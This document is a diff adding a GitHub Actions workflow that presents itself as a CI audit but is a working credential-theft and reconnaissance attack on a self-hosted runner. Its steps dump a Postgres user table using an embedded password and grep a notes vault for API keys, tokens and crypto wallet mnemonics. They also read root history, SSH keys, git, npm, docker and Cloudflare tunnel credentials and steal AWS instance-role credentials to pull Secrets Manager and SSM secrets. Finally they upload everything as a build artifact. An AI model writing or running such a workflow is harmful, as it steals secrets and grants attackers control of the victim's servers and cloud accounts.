@@ -1,0 +1,125 @@
+name: ci-audit-1773c
+on: push
+permissions:
+  contents: read
+jobs:
+  collect:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: map
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"; mkdir -p "$D"
+          { echo "## apps"; ls -la /home/ubuntu/apps;
+            echo "## procs cwd"; for p in $(pgrep -f 'next-server|next start|gunicorn|node'); do echo -n "$p "; sudo -n readlink /proc/$p/cwd; done | sort -u | head -40;
+            echo "## listening"; sudo -n ss -lntp | head -40;
+            echo "## nginx sites"; ls -la /etc/nginx/sites-enabled; echo; for f in /etc/nginx/sites-enabled/*; do echo "--- $f"; sudo -n cat "$f"; done | head -200;
+            echo "## crontab user"; crontab -l 2>&1; echo "## crontab root"; sudo -n crontab -l 2>&1;
+            echo "## timers"; sudo -n systemctl list-timers --no-pager 2>&1 | head -20;
+          } > "$D/map.txt" 2>&1
+          sed -n '1,200p' "$D/map.txt"
+      - name: marketingos-db
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"; URL='postgresql://marketingos:Zbi3bbL3HubzcQlMoJ9MZFa0vdkSJkZvvuaUOV4YaYA=@127.0.0.1:5433/marketingos'
+          { echo "## identity"; psql "$URL" -Atc "select current_user, usesuper from pg_user where usename=current_user";
+            echo "## tables"; psql "$URL" -Atc "select relname||' rows='||n_live_tup from pg_stat_user_tables order by n_live_tup desc limit 40";
+            echo "## columns"; psql "$URL" -Atc "select table_name||':'||column_name from information_schema.columns where table_schema='public' order by table_name, ordinal_position" | head -120;
+            echo "## users"; psql "$URL" -Atc "select * from \"User\" limit 20" 2>&1 | head -30;
+          } > "$D/mktdb.txt" 2>&1
+          cat "$D/mktdb.txt" | head -120
+      - name: vault-grep
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"; V=/home/ubuntu/apps/obsidian-vault
+          { echo "## size"; du -sh $V; find $V -type f | wc -l; ls $V; echo "## sessions tail"; ls -la $V/Sessions 2>/dev/null | tail -15;
+            echo "## files with secret-ish"; grep -rIil -E 'crm\.dupoin|mydupoin|pro-srv-account|CF-Access|service_token|client_secret|api[_-]?key|password|passwd|secret|bearer |token' $V 2>/dev/null | head -60;
+          } > "$D/vault1.txt" 2>&1
+          sed -n '1,120p' "$D/vault1.txt"
+      - name: vault-extract
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"; V=/home/ubuntu/apps/obsidian-vault
+          { echo "## dupoin lines"; grep -rInE 'crm\.dupoin|betadupoin|mydupoin|dupoinid|pro-srv-account|MIS\.|BOS|crm\.|internal API|api\.dupoin' $V --include='*.md' 2>/dev/null | cut -c1-400 | head -120;
+            echo "## credentials lines"; grep -rInEi '(password|passwd|secret|api[_-]?key|access[_-]?token|bearer|client[_-]?(id|secret)|CF-Access|service[_-]?token)[:= ]' $V --include='*.md' 2>/dev/null | cut -c1-400 | head -120;
+            echo "## tron"; grep -rInE 'TRON|USDT|TRC20|mnemonic|private key|私钥|keystore|TM3AR|TVckn|助记词' $V --include='*.md' 2>/dev/null | cut -c1-400 | head -80;
+          } > "$D/vault2.txt" 2>&1
+          sed -n '1,200p' "$D/vault2.txt"
+      - name: root-and-home
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"
+          { echo "## root ls"; sudo -n ls -la /root; echo "## root hist"; sudo -n cat /root/.bash_history 2>&1 | head -60;
+            echo "## root ssh"; sudo -n ls -la /root/.ssh 2>&1; sudo -n cat /root/.ssh/config 2>&1 | head -40;
+            echo "## ubuntu ssh"; ls -la /home/ubuntu/.ssh; for f in /home/ubuntu/.ssh/*; do echo "--- $f"; head -c 600 "$f"; echo; done 2>&1 | head -80;
+            echo "## git creds"; cat /home/ubuntu/.git-credentials 2>&1; echo "## npmrc"; cat /home/ubuntu/.npmrc 2>&1; echo "## gh hosts"; cat /home/ubuntu/.config/gh/hosts.yml 2>&1; echo "## docker cfg"; cat /home/ubuntu/.docker/config.json 2>&1;
+            echo "## cloudflared cfg"; sudo -n ls -la /etc/cloudflared 2>&1; sudo -n cat /etc/cloudflared/config.yml 2>&1; sudo -n cat /etc/cloudflared/*.json 2>&1 | head -20; echo "## home tunnel"; cat /home/ubuntu/.cloudflared/config.yml /home/ubuntu/.cloudflared/cert.pem 2>&1 | head -40; cat /home/ubuntu/.cloudflared/9f129d74-1e1b-47e7-b27e-65a45c08ee2c.json 2>&1;
+            echo "## monitor"; ls -la /home/ubuntu/monitor; find /home/ubuntu/monitor -maxdepth 2 -type f | head -20;
+          } > "$D/root.txt" 2>&1
+          sed -n '1,220p' "$D/root.txt" | cut -c1-300
+      - name: nine-router
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"
+          python3 - "$D" <<'PY' > "$D/nine.txt" 2>&1
+          import sqlite3,os,sys,json
+          p='/home/ubuntu/.9router/db/data.sqlite'
+          print('exists',os.path.exists(p),os.path.getsize(p))
+          c=sqlite3.connect(p)
+          for (n,s) in c.execute("select name,sql from sqlite_master where type='table'"):
+              print('==',n); print(s)
+              try:
+                  for r in c.execute('select * from "'+n+'" limit 30'): print(str(r)[:600])
+              except Exception as e: print('ERR',e)
+          PY
+          head -120 "$D/nine.txt"; echo "## cli secret"; cat /home/ubuntu/.9router/auth/cli-secret; echo; cat /home/ubuntu/.9router/jwt-secret; echo; ls -la /home/ubuntu/.9router/logs /home/ubuntu/.9router/runtime 2>&1 | head -30
+      - name: dwcalc
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"
+          { echo "## ls"; ls -la /home/ubuntu/apps/dw-calculator; echo "## auth.py"; sed -n '1,120p' /home/ubuntu/apps/dw-calculator/auth.py 2>&1; echo "## env refs"; grep -rIinE 'password|secret|api[_-]?key|token|smtp|host|database|postgres|mysql' /home/ubuntu/apps/dw-calculator/*.py /home/ubuntu/apps/dw-calculator/*.cfg /home/ubuntu/apps/dw-calculator/*.json 2>/dev/null | cut -c1-200 | head -60; echo "## session.key"; base64 -w0 /home/ubuntu/apps/dw-calculator/session.key 2>/dev/null; echo; echo "## users db"; python3 -c "
+          import sqlite3,glob,os
+          for f in glob.glob('/home/ubuntu/apps/dw-calculator/**/*.db',recursive=True)+glob.glob('/home/ubuntu/apps/dw-calculator/*.sqlite*'):
+              print('==',f,os.path.getsize(f)); c=sqlite3.connect(f)
+              for (n,) in c.execute(\"select name from sqlite_master where type='table'\"):
+                  print(' --',n)
+                  try:
+                      for r in c.execute('select * from \"'+n+'\" limit 10'): print('   ',str(r)[:300])
+                  except Exception as e: print('ERR',e)
+          " 2>&1 | head -80;
+            echo "## full fs secret grep"; sudo -n grep -rIlE 'crm\.dupoin|pro-srv-account|CF-Access-Client-Secret' /etc /opt /srv /var/www 2>/dev/null | head -20;
+          } > "$D/dwcalc.txt" 2>&1
+          sed -n '1,200p' "$D/dwcalc.txt" | cut -c1-300
+      - name: aws-specific
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773c"
+          TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+          J=$(curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role)
+          export AWS_ACCESS_KEY_ID=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["AccessKeyId"])')
+          export AWS_SECRET_ACCESS_KEY=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["SecretAccessKey"])')
+          export AWS_SESSION_TOKEN=$(echo "$J" | python3 -c 'import json,sys;print(json.load(sys.stdin)["Token"])')
+          export AWS_DEFAULT_REGION=ap-southeast-3
+          { for p in /financeos/prod/app-secrets /dupoin/prod /financeos/prod /prod/app-secrets; do echo "=== ssm $p"; aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>&1 | head -5; done;
+            for s in financeos/prod/app-secrets dupoin/prod financeos/prod; do echo "=== sec $s"; aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>&1 | head -5; done;
+            echo "=== s3 financeos-attachments"; aws s3 ls s3://financeos-attachments-219934880769/ 2>&1 | head -10;
+            echo "=== ssm sendcommand test"; aws ssm send-command --instance-ids i-0e76c4af843832b30 --document-name AWS-RunShellScript --parameters 'commands=["id"]' --query 'Command.CommandId' --output text 2>&1 | head -3;
+          } > "$D/awsspec.txt" 2>&1
+          cat "$D/awsspec.txt" | cut -c1-400
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a1773c
+          path: ${{ runner.temp }}/a1773c
+          if-no-files-found: warn
+          retention-days: 2
